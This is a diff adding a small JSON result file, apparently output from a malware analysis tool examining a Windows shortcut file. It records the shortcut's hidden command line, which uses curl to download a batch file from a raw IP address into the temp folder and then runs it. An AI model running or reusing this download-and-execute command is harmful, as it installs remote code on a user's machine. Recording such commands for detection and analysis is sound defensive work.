@@ -1,0 +1,25 @@
+{
+    "response": {
+        "supplementary": [],
+        "extracted": []
+    },
+    "result": {
+        "heuristics": [
+            1
+        ],
+        "tags": {
+            "file.date.creation": [
+                "2021:09:18 17:06:25+00:00"
+            ],
+            "file.date.last_modified": [
+                "2021:09:18 17:06:26+00:00"
+            ],
+            "file.name.extracted": [
+                "cmd.exe"
+            ],
+            "file.shortcut.command_line": [
+                "..\\..\\..\\Windows\\System32\\cmd.exe /c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\""
+            ]
+        }
+    }
+}
